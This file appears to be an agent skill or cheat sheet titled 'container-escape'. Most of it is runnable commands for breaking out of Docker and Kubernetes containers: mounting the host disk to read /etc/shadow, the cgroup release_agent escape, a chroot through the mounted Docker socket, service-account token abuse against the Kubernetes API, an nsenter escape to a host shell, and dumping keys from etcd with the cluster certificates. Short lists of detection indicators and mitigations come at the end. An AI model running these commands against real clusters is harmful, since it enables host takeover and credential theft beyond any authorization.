---
name: container-escape
description: Docker/Kubernetes container breakout, namespace abuse, runtime exploitation.
---

# Container Escape Techniques

## 1. Docker Escape

### Privileged Container (CAP_SYS_ADMIN)
```bash
# Method 1: Mount host filesystem
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
cat /tmp/hostfs/etc/shadow

# Method 2: cgroups escape (release_agent)
mkdir /tmp/escape
mount -t cgroup -o rdma cgroup /tmp/escape
mkdir /tmp/escape/x
echo 1 > /tmp/escape/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/escape/x/cgroup.procs"
```

### Docker Socket Mount
```bash
# If /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host
```

### Container Breakout via Kernel Exploit
```bash
# CVE-2022-0185 (heap overflow in legacy_parse_param)
# CVE-2022-0492 (cgroups escape)
# CVE-2024-21625 (Leaky Vessels)
```

## 2. Kubernetes Escape

### Service Account Token Abuse
```bash
# Check if SA token exists
ls /var/run/secrets/kubernetes.io/serviceaccount/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# List pods
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### Pod Security Bypass
```yaml
# If pod has hostPID, hostNetwork, or hostIPC
# Escape to host via nsenter
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

### etcd Access
```bash
# If etcd is exposed
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only
```

## 3. Detection Indicators

- Container process accessing host filesystem
- Unexpected network connections from container
- SA token usage from non-pod context
- cgroup notification_on_release usage
- Docker socket access from container

## 4. Mitigations

- Run containers as non-root (PID 1 != root)
- Drop all capabilities, add only needed ones
- Use read-only root filesystem
- Enable AppArmor/SELinux profiles
- Network policies for pod-to-pod traffic
- Pod Security Standards (restricted)
